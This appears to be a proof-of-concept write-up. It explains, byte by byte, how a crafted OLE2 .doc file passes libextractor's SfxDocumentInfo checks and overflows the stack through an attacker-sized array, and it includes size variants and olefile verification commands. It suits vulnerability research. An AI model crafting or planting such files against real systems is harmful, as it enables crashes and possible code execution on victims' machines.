# Malicious .doc File Structure

## Overview

The exploit file is a valid **OLE2 / Microsoft Compound Document File** (the format used by `.doc`, `.xls`, `.ppt` before Office 2007). Any tool that recognizes OLE2 — including Microsoft Word, LibreOffice, and file managers — will identify it as a legitimate document.

The key: it contains a **SfxDocumentInfo** stream with an oversized payload that triggers the VLA stack overflow when libextractor's OLE2 plugin processes it.

## File Layout (hex)

```
Offset     Size       Content                    Purpose
─────────────────────────────────────────────────────────────────
0x0000     512 bytes  CFB Header                 Identifies file as OLE2
0x0200     512 bytes  Directory Sector           Lists streams in the file
0x0400     N bytes    Stream Data (payload)      The SfxDocumentInfo content
0x0400+N   M bytes    FAT (allocation table)     Maps sector chains
```

## CFB Header (offset 0x0000, 512 bytes)

```
┌─────────────────────────────────────────────────────────────┐
│ D0 CF 11 E0 A1 B1 1A E1   ← OLE2 magic signature          │
│ ... version, sector size, FAT pointers ...                  │
│ DIFAT[0] = sector of FAT                                    │
└─────────────────────────────────────────────────────────────┘
```

This is standard OLE2 boilerplate. Nothing malicious here — it just makes the file a valid container.

## Directory Sector (offset 0x0200, 512 bytes)

Contains two 128-byte entries:

```
Entry 0: Root Entry (required by OLE2 spec)
┌─────────────────────────────────────────────────────────────┐
│ Name: "Root Entry" (UTF-16LE)                               │
│ Type: 5 (Root Storage)                                      │
│ Child: Entry 1                                              │
└─────────────────────────────────────────────────────────────┘

Entry 1: SfxDocumentInfo  ← THIS IS THE TRIGGER
┌─────────────────────────────────────────────────────────────┐
│ Name: "SfxDocumentInfo" (UTF-16LE)                          │
│ Type: 2 (Stream)                                            │
│ Start Sector: 1 (offset 0x0400 in file)                     │
│ Size: 2,097,152 (2MB) ← ATTACKER CONTROLS THIS             │
│                                                             │
│ This size becomes the VLA in process_star_office():          │
│     char buf[2097152];  // 2MB on the stack!                │
└─────────────────────────────────────────────────────────────┘
```

**The `Size` field in this directory entry is what triggers the vulnerability.** libextractor reads it via `gsf_input_size()` and uses it directly as the VLA size.

## Stream Data — SfxDocumentInfo Content (offset 0x0400)

```
Offset     Value              Why
──────────────────────────────────────────────────────────────
0x0000     0x0F               Magic byte 1 (passes buf[0] check)
0x0001     0x00               Magic byte 2 (passes buf[1] check)
0x0002     "SfxDocumentInfo"  15-byte string (passes strncmp)
0x0011     0x0B               Required flag (passes buf[0x11] check)
0x0012     0x00               Not encrypted (passes buf[0x12] check)
0x0013     0x00               Required zero (passes buf[0x13] check)
0x0014     0x41 0x41 0x41...  Filler ('A' repeated to end)
  ...        ...              
0x1FFFFF   0x41               End of 2MB stream

Total: 2,097,152 bytes (or 3,932,160 for the 3.9MB variant)
```

### Why these specific bytes?

The `process_star_office()` function validates the stream content before processing:

```c
if ( (buf[0] != 0x0F) ||          // ← We set 0x0F     ✓
     (buf[1] != 0x0) ||           // ← We set 0x00     ✓
     (0 != strncmp (&buf[2],
                    "SfxDocumentInfo",
                    strlen("SfxDocumentInfo"))) || // ← We match  ✓
     (buf[0x11] != 0x0B) ||       // ← We set 0x0B     ✓
     (buf[0x13] != 0x00) ||       // ← We set 0x00     ✓
     (buf[0x12] != 0x00) )        // ← We set 0x00     ✓
  return 0;  // REJECTED — but we pass all checks!
```

If ANY check fails, the function returns early (safe). Our payload passes all 6 checks, so execution continues into the metadata extraction code — but by then, the stack overflow has already happened at `char buf[size]`.

## The Vulnerability Trigger Sequence

```
1. libextractor opens the .doc file
2. libgsf parses OLE2 header → finds "SfxDocumentInfo" stream
3. gsf_input_size() returns 2,097,152 (from directory entry)
4. process_star_office() is called:

   off_t size = gsf_input_size(src);     // size = 2,097,152
   
   if (size > 4 * 1024 * 1024)           // 2MB < 4MB → passes
     return 0;
   
   char buf[size];                        // ← OVERFLOW HAPPENS HERE
                                          //   Compiler emits: sub %rax,%rsp
                                          //   RSP moves 2MB down
                                          //   If stack < 2MB → past the boundary
   
   gsf_input_read(src, size, buf);        // Writes our 'AAAA...' into buf
                                          // (in real exploit: ROP chain here)
```

## Size Variants

| Payload Size | File Size | Overflows Stacks ≤ | Use Case |
|---|---|---|---|
| 2 MB | ~2.1 MB | 2 MB | Thread stacks (default pthread) |
| 3.9 MB | ~4.0 MB | 4 MB | Process stacks with `ulimit -s 4096` |

The maximum allowed by the code is 4MB (`4 * 1024 * 1024`). Larger values are rejected.

## Verification

You can inspect the generated file with standard tools:

```bash
# Verify it's valid OLE2
python3 -c "import olefile; print(olefile.OleFileIO('exploit.doc').listdir())"
# Output: [['SfxDocumentInfo']]

# Check stream size
python3 -c "import olefile; o=olefile.OleFileIO('exploit.doc'); print(o.get_size('SfxDocumentInfo'))"
# Output: 2097152

# hexdump the first bytes of the stream
python3 -c "
import olefile
o = olefile.OleFileIO('exploit.doc')
data = o.openstream('SfxDocumentInfo').read(32)
print(data.hex(' '))
"
# Output: 0f 00 53 66 78 44 6f 63 75 6d 65 6e 74 49 6e 66 6f 0b 00 00 41 41 41 41...
#              ^^ S  f  x  D  o  c  u  m  e  n  t  I  n  f  o  ^^ ^^ ^^ A  A  A  A
```
